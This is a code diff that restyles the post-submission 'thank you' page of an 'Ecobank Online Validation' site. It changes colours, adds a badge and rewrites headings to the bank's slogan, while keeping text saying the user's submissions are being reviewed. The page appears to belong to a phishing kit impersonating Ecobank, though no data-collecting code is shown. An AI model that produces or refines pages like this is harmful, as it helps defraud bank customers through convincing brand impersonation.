@@ -8,7 +8,7 @@
   body {
     font-family: Arial, sans-serif;
     margin: 0;
-    background: linear-gradient(to bottom, #08143a, #0b1d4d);
+    background: linear-gradient(to bottom, #2b6cb0, #2a4365); /* lighter blue gradient */
     display: flex;
     flex-direction: column;
     align-items: center;
@@ -18,7 +18,7 @@
   }
 
   .header {
-    background: linear-gradient(135deg, #08143a, #0b1d4d);
+    background: linear-gradient(135deg, #2b6cb0, #2a4365); /* lighter gradient */
     color: #fff;
     text-align: center;
     width: 100%;
@@ -27,39 +27,56 @@
     border-bottom-right-radius: 40px;
     box-shadow: 0 4px 10px rgba(0,0,0,0.3);
   }
-  .header h1 { margin: 0; font-size: 24px; }
-  .header p { margin: 8px 0 0; font-size: 14px; }
+
+  .title-badge {
+    display: inline-block;
+    background: linear-gradient(135deg, #1e3c72, #2a5298); /* pill-style blue badge */
+    color: #fff;
+    padding: 12px 20px;
+    border-radius: 50px;
+    font-size: 20px;
+    font-weight: bold;
+    text-transform: uppercase;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.25);
+    margin-bottom: 10px;
+  }
+
+  .header p {
+    margin: 8px 0 0;
+    font-size: 14px;
+  }
 
   .thankyou-container {
-    background: linear-gradient(145deg, rgba(10,25,70,0.95), rgba(15,35,90,0.95));
+    background: #fff;
     width: 90%;
     max-width: 400px;
     margin-top: -30px;
     padding: 30px 25px;
     border-radius: 12px;
     box-shadow: 0 6px 16px rgba(0,0,0,0.4);
-    backdrop-filter: blur(4px);
     text-align: center;
+    color: #333;
   }
 
   .thankyou-container h2 {
     font-size: 20px;
     margin-bottom: 15px;
-    color: #1e90ff;
+    color: #28a745; /* green success */
   }
+
   .thankyou-container p {
     font-size: 16px;
-    color: #fff;
+    color: #333;
     margin-bottom: 20px;
     line-height: 1.5;
   }
 
   .back-btn {
-    background: linear-gradient(135deg, #1e90ff, #187bcd);
+    background: linear-gradient(135deg, #28a745, #218838);
     color: #fff;
     border: none;
     padding: 12px 20px;
-    border-radius: 6px;
+    border-radius: 50px; /* pill shape */
     font-size: 16px;
     font-weight: bold;
     cursor: pointer;
@@ -67,14 +84,15 @@
     display: inline-block;
     transition: all 0.3s ease;
   }
+
   .back-btn:hover {
-    background: linear-gradient(135deg, #187bcd, #1560a3);
+    background: linear-gradient(135deg, #218838, #1e7e34);
     transform: scale(1.05);
     box-shadow: 0 4px 12px rgba(0,0,0,0.4);
   }
 
   @media (max-width: 500px) {
-    .header h1 { font-size: 20px; }
+    .title-badge { font-size: 18px; padding: 10px 16px; }
     .thankyou-container { padding: 25px 20px; }
     .thankyou-container h2 { font-size: 18px; }
     .thankyou-container p { font-size: 14px; }
@@ -84,12 +102,12 @@
 <body>
 
 <div class="header">
-  <h1>Secure Authentication</h1>
-  <p>Ecobank Online Validation</p>
+  <h1 class="title-badge">ECOBANK ONLINE VALIDATION</h1>
+  <p>A Better Way To Bank Your Way</p>
 </div>
 
 <div class="thankyou-container">
-  <h2>✅ Thank you for validating your account!</h2>
+  <h2>✅ Thank You For Choosing Ecobank, The Pan African Bank!</h2>
   <p>
     Your submissions have been received and are being reviewed.<br>
     A message will be delivered via email or SMS after confirmation.
